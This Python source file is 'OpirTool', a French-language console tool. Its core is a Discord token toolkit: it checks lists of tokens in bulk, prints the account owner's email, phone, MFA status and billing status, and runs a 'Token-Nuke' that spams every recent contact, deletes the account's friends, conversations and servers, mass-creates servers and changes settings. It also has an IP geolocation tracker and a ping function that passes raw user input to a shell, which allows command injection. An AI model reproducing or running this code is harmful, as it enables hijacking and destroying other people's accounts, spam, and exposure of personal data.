from requests import get, post, patch, delete
from json import dumps, loads
from colorama import Fore, init
from threading import Thread
from time import sleep
import discord
from discord.ext import commands
from os import name, system, getenv
from os.path import isfile, isdir, split as split_path
from subprocess import check_output
import urllib.request as urllib2

import os
import requests
import json

init()

if name == "nt":
    system("title OpirTool")
    system("mode 160, 40")
    def clear():
        system("cls")
else:
    def clear():
        system("clear")

erreur = Fore.RESET + "[" + Fore.RED + "!" + Fore.RESET + "]"
valide = Fore.RESET + "[" + Fore.GREEN + "!" + Fore.RESET + "]"

nom_pc = getenv("username")


liste_oui = ["oui", "oe", "ouai", "ui", "oue"]
liste_non = ["nn", "non", "nan", "nop"]


##########################################
############ IP TOOL #####################
##########################################


def ip_track():
    clear()

    ip = input("Entre l'ip que tu veut traquer: ")
    url = "http://ip-api.com/json/"
    response = urllib2.urlopen(url + ip)
    data = response.read()
    values = json.loads(data)
    
    

    print(" IP: " + values['query'])
    print(" Ville: " + values['city'])
    print(" Région: " + values['regionName'])
    print(" Pays: " + values['country'])
    print(" Code pays: " + values['countryCode'])
    print(" ZIP code: " + values['zip'])
    print(" latitude: ")
    print(values['lat'])
    print(" longitude: ")
    print(values['lon'])
    print(" TimeZone: " + values['timezone'])
    print(" ISP: " + values['isp'])
    print(" org: " + values['org'])
    print(" as: " + values['as'])
    input(Fore.RESET + "\nAppuyez sur entrée pour revenir au menu...")


def ip_pinger():
    clear()
    
    ip = input(Fore.RED + "IP > ")

    print("")
    try:
        result = check_output(f"ping {ip} -n 1", shell=True).decode("cp850")
        infos = input(Fore.BLUE + "L'IP est valide. Voulez-vous voir les informations avancées? [y/n] ")
        if infos == "y":
            print(Fore.GREEN + "\n" + result)
    except:
        print(Fore.RED + "L'IP est invalide :/")
    input(Fore.RESET + "\nAppuyez sur entrée pour revenir au menu...")

def ip_tools():
    clear()
    mode = input(Fore.MAGENTA + """
        
                                                        ██╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     ███████╗
                                                        ██║██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
                                                        ██║██████╔╝       ██║   ██║   ██║██║   ██║██║     ███████╗
                                                        ██║██╔═══╝        ██║   ██║   ██║██║   ██║██║     ╚════██║
                                                        ██║██║            ██║   ╚██████╔╝╚██████╔╝███████╗███████║
                                                        ╚═╝╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
                                                    __________________________________________________________________                                                            
                                                        1 : IP Pinger                               2 : IP Track
                                                    __________________________________________________________________
                                                                        [>] Mode : """)
    
    if mode == "1":
        ip_pinger()

    if mode == "2":
        ip_track()



















##########################################
############ TOKEN TOOL ##################
##########################################
def headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
    if token:
        headers.update({"Authorization":token})
    return headers


headers_site = {
        "Content-Type": "application/json",
        "User-Agent": "localtunnel"
        }



"""
TOKEN DEF
"""

friendsIds = []
channelIds = []
guildsIds = []

def token_check(token):
    headers_token = headers(token)
    try:
        statut = get("https://discordapp.com/api/v6/users/@me", headers=headers_token).status_code
    except:
        statut = 401
    if statut not in [200, 204]:
        return False
    else:
        return True

class Login(discord.Client):
    async def on_connect(self):
        for f in self.user.friends:
            friendsIds.append(f.id)

        for c in self.private_channels:
            channelIds.append(c.id)

        for g in self.guilds:
            guildsIds.append(g.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except:
            clear()
            print("Erreur fatale. Veuillez réessayer :/")
            input()
            exit()

def token_nuke(token):
    clear()
    print(Fore.GREEN + "Récupération des statistiques du compte...")
    Login().run(token) 
    clear()
    headers1 = {'Authorization': token}
    sendall = input(Fore.BLUE + 'Veux tu envoyer un message à tous les amis récemment contactés? [oui-non] ')
    if sendall == 'oui':
        sendmessage = input(Fore.BLUE + 'Que veux-tu envoyer comme message aux amis récents? ')
    fremove = input(Fore.BLUE + 'Veux-tu supprimer toutes les conversations de ce compte? [oui-non] ')
    fdel = input(Fore.BLUE + 'Veux-tu supprimer tous les amis de ce compte? [oui-non] ')
    gdel = input(Fore.BLUE + 'Veux tu supprimer tous les serveurs de ce compte ? [oui-non] ')
    gleave = input(Fore.BLUE + 'Veux-tu quitter tous les serveurs? [oui-non] ')
    gcreate = input(Fore.BLUE + 'Veux-tu créer masse serveurs sur ce compte? [oui-non] ')
    if gcreate == "oui":
        gname = input(Fore.BLUE + "Comment veux-tu que les serveurs crées s'appellent? ")
        gserv = input(Fore.BLUE + 'Combien de serveurs veux-tu créer? [max. 100] ')
    dlmode = input(Fore.BLUE + 'Veux-tu définir le thème du compte en blanc? [oui-non] ')
    langspam = input(Fore.BLUE + 'Veux-tu définir la langue du compte en japonais? [oui-non] ')

    if sendall == 'oui':
        try:
            for id in channelIds:
                post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers1, data={"content": f"{sendmessage}"})
                print(Fore.GREEN + f"Message envoyé à l'ID : {id}.")
        except:
            print(Fore.Red + f'Erreur détectée.')

    if gleave == 'oui':
        try:
            for guild in guildsIds:
                delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers1)
                print(Fore.GREEN + f'Serveur {guild} quitté.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if fdel == 'oui':
        try:
            for friend in friendsIds:
                delete(f'https://discord.com/api/v8/users/@me/relationships/{friend}', headers=headers1)
                print(Fore.GREEN + f'Ami {friend} supprimé.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if fremove == 'oui':
        try:
            for id in channelIds:
                delete(f'https://discord.com/api/v8/channels/{id}', headers=headers1)
                print(Fore.GREEN + f'Conversation {id} supprimée.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if gdel == 'oui':
        try:
            for guild in guildsIds:
                delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers1)
                print(Fore.GREEN + f'Serveur {guild} supprimé.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if gcreate == 'oui':
        try:
            for i in range(int(gserv)):
                payload = {
                    'name': f'{gname}',
                    'region': 'europe', 
                    'icon': None, 
                    'channels': None}
                post('https://discord.com/api/v6/guilds', headers=headers1, json=payload)
                print(Fore.GREEN + f'Serveur [{gname}] crée, numéro: {i + 1} sur {gserv}.')
        except:
            print(Fore.Red + f'Erreur détectée.')

    if dlmode == 'oui':
        try:
            setting = {'theme': "light"}
            patch("https://discord.com/api/v8/users/@me/settings", headers=headers1, json=setting)
            print(Fore.GREEN + "Le thème du compte à été défini sur blanc.")
        except:
            print(Fore.Red + f'Erreur détectée.')

    if langspam == 'oui':
        try:
            setting = {'locale':'ja'}
            patch("https://discord.com/api/v8/users/@me/settings", headers=headers1, json=setting)
            print(Fore.GREEN + "La langue du compte à été définie sur japonais")
        except:
            print(Fore.Red + f'Erreur détectée.')

    input(Fore.RED + "\nAppuyez sur entrée pour continuer...")
    clear()


def token_info(token):
    print(Fore.GREEN + "\nChargement en cours...")
    r = get('https://discord.com/api/v6/users/@me', headers=headers(token)).json()
    username = r['username'] + '#' + r['discriminator']
    userid = r['id']
    phone = r['phone']
    email = r['email']
    try:
        billing = bool(len(loads(get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=headers(token)).read().decode())) > 0)
    except:
        billing = False
    mfa = r['mfa_enabled']
    clear()
    print(Fore.GREEN + f'''
[ID de l'utillisateur]                    {userid}
[Nom d'utilisateur]                       {username}
[Authentification à deux facteurs]        {mfa}
[Carte bleue enregistrée]                 {billing}
[Email]                                   {email}
[Numéro de téléphone]                     {phone if phone else "Pas de numéro de téléphone :/"}
[Token]                                   {token}
    ''')
    input(Fore.RED + "\nAppuyez sur entrée pour continuer...")
    clear()

def mass_token_check(path):
    with open(path, "r") as f:
        contenu = f.read()
        contenu = contenu.splitlines()
    check = []
    valide = []
    for a in contenu:
        if a != "":
            check.append(a)

    largeur = 0
    longueur = len(contenu)
    for token in check:
        if token_check(token) == True:
            largeur += 1
            valide.append(token)
    return largeur, longueur, valide

##########################################
############ TOKEN TOOLS ########################
##########################################

def token_mode():
    clear()
    print(Fore.RED + """
    
    
        
                                     ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ████████╗ ██████╗  ██████╗ ██╗     ███████╗
                                     ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
                                        ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║       ██║   ██║   ██║██║   ██║██║     ███████╗
                                        ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║       ██║   ██║   ██║██║   ██║██║     ╚════██║
                                        ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║       ██║   ╚██████╔╝╚██████╔╝███████╗███████║
                                        ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
                                     ___________________________________________________________________________________________
                                             
                                                1 : Token-Nuke           3 : Token-Info              5 : Mass-Token-Check
                                                2 : Token-Spam           4 : Token-Checker           6 : Token delete
                                     ___________________________________________________________________________________________
                                                                  
                                                                    entrez [q] pour revenir au menu                                             
                                                                                                            
    """)

    token_choice_mode = input(Fore.BLUE + """                                                       [>] Mode : """)

    if token_choice_mode not in ["1", "2", "3", "4", "5", "6", "q"]:
        token_mode()

    elif token_choice_mode == "q":
        return

    if token_choice_mode == "5":
        path = input(Fore.GREEN + "\n\n[>] Path du fichier qui contient les tokens [.txt] : ")
        if isfile(path):
            lan, leng, cont = mass_token_check(path)
            print(Fore.BLUE + f'{lan} sur {leng} tokens sont valides.')
            ouinon = input(Fore.MAGENTA + f"\nVoulez-vous enregistrer les tokens valides dans un nouveau fichier ou supprimer les tokens invalides de l'ancien fichier? [y/n/s] ")
            if ouinon == "y":
                new_path = split_path(path)[0:-1][0] + "/valid_tokens.txt"
                if isfile(new_path):
                    print("\n"+ erreur + "Le fichier spécifié existe déjà.")
                    input(Fore.RESET + "\nAppuyez sur entrée pour revenir au menu.")
                    token_mode()
                else:
                    with open(new_path, "w") as f:
                        for a in cont:
                            f.write(a + "\f")
                    print(Fore.GREEN + "\nLe fichier vient d'être créé à [" + Fore.RESET + new_path + Fore.RESET + "].")
                    input(Fore.RESET + "\nAppuyez sur entrée pour revenir au menu.")
                    token_mode()
            elif ouinon == "s":
                with open(path, "w") as f:
                    for a in cont:
                        f.write(a + "\f")
                print(Fore.GREEN + "\nLe fichier à été mis a jour avec succés.")
                input(Fore.RESET + "\nAppuyez sur entrée pour revenir au menu.")
                token_mode()
                
                    
            else:
                input(Fore.RESET + "\nAppuyez sur entrée pour revenir au menu.")
                token_mode()
                    
        else:
            print("\n" + erreur + "Erreur, le fichier spécifié n'existe pas :/")
            input(Fore.RED + "\nAppuyez sur entrée pour revenir au menu...")
            main()



    token = input(Fore.GREEN + "\n\n[>] Token : ")
    retour = token_check(token)

    if retour == False:
        print(Fore.RED + "\nLe token est invalide :/")
        input(Fore.RESET + "\nAppuyez sur entrée pour continuer...")
        token_mode()

    if token_choice_mode == "1":
        token_nuke(token)
        clear()
        token_mode()

    if token_choice_mode == "3":
        token_info(token)

    if token_choice_mode == "4":
        print(Fore.BLUE + "\nLe token est valide xD")
        input(Fore.RESET + "\nAppuyez sur entrée pour continuer...")
        token_mode()
##########################################
##########################################
##########################################
            
def main():
    clear()
    print(Fore.BLUE + """

                                                 ██████╗ ██████╗ ██╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     
                                                ██╔═══██╗██╔══██╗██║██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
                                                ██║   ██║██████╔╝██║██████╔╝       ██║   ██║   ██║██║   ██║██║     
                                                ██║   ██║██╔═══╝ ██║██╔══██╗       ██║   ██║   ██║██║   ██║██║     
                                                ╚██████╔╝██║     ██║██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
                                                 ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                
""")

    print(Fore.RED + """                                           
                                            Fait par Opir#0001 | Quelques bout de code sont pris de Billy (discord.gg/plague)   
                                                    ____________________________________________________________________________
                                                                                                                    
                                                        1 : Token Tool (pris de Billy)      2 : IP TOOL    3 : jsp jsp jsp                                                                                                                                
                                                                                                                
                                                        4 : jsp jsp                         4 : jsp        6 : jsp jsp jsp
                                                    ____________________________________________________________________________""")                                           
                                                          

    mode = input(Fore.BLUE + """                                                         [>] Mode : """)

    if mode == "1":
        token_mode()
        return
    if mode == "2":
        ip_tools()


while True:
    clear() 
    main()

